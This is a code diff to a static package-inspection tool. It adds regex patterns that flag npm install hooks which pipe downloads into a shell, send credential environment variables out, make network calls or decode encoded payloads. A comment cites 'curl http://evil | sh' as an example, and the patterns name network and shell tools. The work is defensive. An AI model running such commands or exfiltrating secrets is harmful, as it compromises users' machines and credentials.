@@ -99,6 +99,75 @@ PATTERNS: tuple[tuple[str, str, re.Pattern[str]], ...] = (
     ),
 )
 
+# npm install hooks are *shell commands*, not source code. The patterns above
+# were written for Python and JavaScript idioms and missed every shape that
+# actually appears: `curl http://evil | sh` carries no `curl -` flag, `node -e`
+# is not `eval(`, and `powershell -c IWR` looks nothing like `urllib.request`.
+SHELL_PATTERNS: tuple[tuple[str, str, re.Pattern[str]], ...] = (
+    (
+        "pipe-to-shell",
+        "downloads a script and pipes it straight into a shell",
+        re.compile(
+            r"(curl|wget|fetch|iwr|invoke-webrequest)\b[^|;&\n]*\|\s*"
+            r"(sh|bash|zsh|dash|node|python[0-9.]*|perl|ruby)\b",
+            re.IGNORECASE,
+        ),
+    ),
+    (
+        "exfiltration",
+        "sends an environment variable somewhere",
+        re.compile(
+            r"(\$\{?[A-Z_]*(TOKEN|SECRET|PASSWORD|_KEY)|process\.env\.[A-Za-z_]*"
+            r"(TOKEN|SECRET|PASSWORD|KEY))[\s\S]{0,200}?"
+            r"(curl|wget|https?://|fetch\(|axios|iwr\b)",
+            re.IGNORECASE,
+        ),
+    ),
+    (
+        "network",
+        "makes a network request at install time",
+        re.compile(
+            r"(\bcurl\b|\bwget\b|\biwr\b|invoke-webrequest|\bnc\b\s+-|https?://)",
+            re.IGNORECASE,
+        ),
+    ),
+    (
+        "inline-script",
+        "runs code passed on the command line",
+        re.compile(
+            r"\b(node|python[0-9.]*|ruby|perl|php)\b\s+(-e|-c|--eval)\b"
+            r"|\bpowershell\b[^\n]{0,80}\s-(c|command|enc|encodedcommand)\b",
+            re.IGNORECASE,
+        ),
+    ),
+    (
+        "encoded-payload",
+        "decodes an encoded blob at install time",
+        re.compile(
+            r"(base64\s+-d|base64\s+--decode|atob\(|Buffer\.from\([^)]*base64|"
+            r"frombase64string|-enc(odedcommand)?\b)",
+            re.IGNORECASE,
+        ),
+    ),
+    (
+        "environment",
+        "reads a credential from the environment at install time",
+        # Far more pointed in a shell hook than in build code: an install
+        # script has no ordinary reason to read a token.
+        re.compile(
+            r"(process\.env\.[A-Za-z_]*(TOKEN|SECRET|PASSWORD|KEY)"
+            r"|\$\{?[A-Z_]*(TOKEN|SECRET|PASSWORD|_KEY)\b)",
+        ),
+    ),
+)
+
+# `"postinstall": "node install.js"` is the commonest shape of all, and the
+# interesting code lives in the file it names rather than in the hook itself.
+REFERENCED_SCRIPT = re.compile(
+    r"\b(?:node|python[0-9.]*|sh|bash|ruby|perl)\s+"
+    r"(?:\./)?([A-Za-z0-9_./-]+\.(?:js|cjs|mjs|py|sh|rb|pl))\b"
+)
+
 # A long unbroken base64-looking run is worth flagging on its own.
 BLOB = re.compile(r"['\"][A-Za-z0-9+/]{220,}={0,2}['\"]")
 
@@ -107,11 +176,15 @@ class InspectionError(RuntimeError):
     """The archive could not be retrieved or read."""
 
 
-def scan_text(text: str, where: str) -> list[Signal]:
-    """Pattern-match one install script. Never executes anything."""
+def scan_text(text: str, where: str, shell: bool = False) -> list[Signal]:
+    """Pattern-match one install script. Never executes anything.
+
+    `shell=True` selects the command-line patterns used for npm hooks; the
+    default set describes Python and JavaScript source.
+    """
     found: list[Signal] = []
     seen: set[str] = set()
-    for kind, detail, pattern in PATTERNS:
+    for kind, detail, pattern in (SHELL_PATTERNS if shell else PATTERNS):
         if kind in seen:
             continue
         if pattern.search(text):
@@ -181,46 +254,86 @@ def _npm_hook_source(text: str) -> str:
     )
 
 
-def inspect_archive(data: bytes, ecosystem: str) -> list[Signal]:
-    """Walk an archive in memory and scan its install-time files."""
-    signals: list[Signal] = []
-    buffer = io.BytesIO(data)
+def _members(data: bytes) -> "dict[str, str]":
+    """Read the archive into a dict of path -> text, in memory only.
 
+    Nothing is extracted to disk, so a path-traversal entry has nowhere to
+    write. Member count and member size are capped so a decompression bomb
+    cannot exhaust memory.
+    """
+    out: dict[str, str] = {}
+    buffer = io.BytesIO(data)
     try:
         if data[:2] == b"PK":
             with zipfile.ZipFile(buffer) as archive:
                 for info in archive.infolist()[:MAX_MEMBERS]:
-                    if info.is_dir() or not _interesting(info.filename, ecosystem):
+                    if info.is_dir():
                         continue
                     text = _read_member(archive, info.filename, info.file_size)
-                    if text is None:
-                        continue
-                    if ecosystem == "npm":
-                        text = _npm_hook_source(text)
-                    if text.strip():
-                        signals += scan_text(text, info.filename.rsplit("/", 1)[-1])
+                    if text is not None:
+                        out[info.filename] = text
         else:
             with tarfile.open(fileobj=buffer, mode="r:*") as archive:
                 for member in archive.getmembers()[:MAX_MEMBERS]:
-                    if not member.isfile() or not _interesting(member.name, ecosystem):
+                    if not member.isfile():
                         continue
                     text = _read_member(archive, member, member.size)
-                    if text is None:
-                        continue
-                    if ecosystem == "npm":
-                        text = _npm_hook_source(text)
-                    if text.strip():
-                        signals += scan_text(text, member.name.rsplit("/", 1)[-1])
+                    if text is not None:
+                        out[member.name] = text
     except (tarfile.TarError, zipfile.BadZipFile, EOFError, OSError) as exc:
         raise InspectionError(f"could not read archive: {exc}") from exc
+    return out
+
+
+def _root_of(path: str) -> str:
+    parts = path.strip("/").split("/")
+    return parts[0] if parts else ""
+
+
+def inspect_archive(data: bytes, ecosystem: str) -> list[Signal]:
+    """Statically inspect one package's install-time code.
+
+    Nothing is executed, imported or compiled -- every file is read as text and
+    matched against patterns.
+    """
+    members = _members(data)
+    signals: list[Signal] = []
+
+    for path, text in members.items():
+        if not _interesting(path, ecosystem):
+            continue
+        where = path.rsplit("/", 1)[-1]
+
+        if ecosystem != "npm":
+            if text.strip():
+                signals += scan_text(text, where)
+            continue
+
+        hooks = _npm_hook_source(text)
+        if not hooks.strip():
+            continue
+        # Hooks are shell commands, so they need the shell patterns.
+        signals += scan_text(hooks, where, shell=True)
+
+        # `"postinstall": "node install.js"` is the commonest shape, and the
+        # code that matters is in the file it names. Read that too, with the
+        # source patterns, since it is JavaScript rather than a command line.
+        root = _root_of(path)
+        for referenced in set(REFERENCED_SCRIPT.findall(hooks)):
+            target = f"{root}/{referenced.lstrip('./')}"
+            script = members.get(target)
+            if script and script.strip():
+                signals += scan_text(script, referenced)
 
     # keep the first signal of each kind, most alarming first
     order = {kind: i for i, (kind, _, _) in enumerate(PATTERNS)}
+    order.update(
+        {kind: i for i, (kind, _, _) in enumerate(SHELL_PATTERNS) if kind not in order}
+    )
     unique: dict[str, Signal] = {}
     for signal in signals:
         unique.setdefault(signal.kind, signal)
     return sorted(unique.values(), key=lambda s: order.get(s.kind, 99))
-
 
 def inspect_package(archive_url: str, ecosystem: str) -> list[Signal]:
     """Download and statically inspect one package's install-time code."""
